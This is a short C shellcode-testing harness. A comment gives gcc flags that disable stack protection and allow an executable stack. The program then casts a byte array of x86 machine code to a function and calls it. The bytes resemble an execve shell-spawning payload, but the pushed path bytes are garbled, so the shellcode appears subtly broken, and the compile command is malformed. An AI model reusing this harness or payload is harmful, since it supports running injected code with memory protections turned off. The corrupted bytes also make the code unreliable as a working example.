// compile with
// gcc -fno-stack-protector -z execstack _shellskeleton.c shellskeleton

#include<stdio.h>
#include<string.h>

unsigned char code [] = \
"\x31\xc0\x89\xc2\x89\xc1\xb0\x0b\x52\x68\x2f\x2f\x3f\x68\x68\x2f\xff\xe3\x06\x89\xe3\xcd\x80";


main()
{
    printf("Shellcode Length: %d\n", strlen(code));
    int (*ret)() = (int(*)())code;
    ret();
}
